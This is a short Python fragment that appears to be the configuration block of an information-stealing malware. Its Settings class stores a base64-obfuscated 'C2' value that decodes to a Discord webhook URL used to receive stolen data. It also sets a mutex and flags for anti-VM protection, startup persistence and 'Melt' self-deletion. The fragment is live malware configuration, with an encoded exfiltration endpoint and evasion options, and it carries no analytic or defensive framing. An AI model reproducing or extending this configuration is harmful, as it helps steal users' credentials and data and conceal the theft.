...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI0NDAyNDA4Mzc5Njk4Mzg1MC9XeFB1Y1hDWVYzQzEwREFMdFFqc1RXVVBhVE8xN1lTUGM1MC1tRlVNbmZQYnhWN2E2Uk9QV1FPRGdHNFFrek83WlQtag==').decode())
    Mutex = base64.b64decode('YU9DS1BuWnZNQzBERElNMw==').decode()
    PingMe = bool('')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('true')
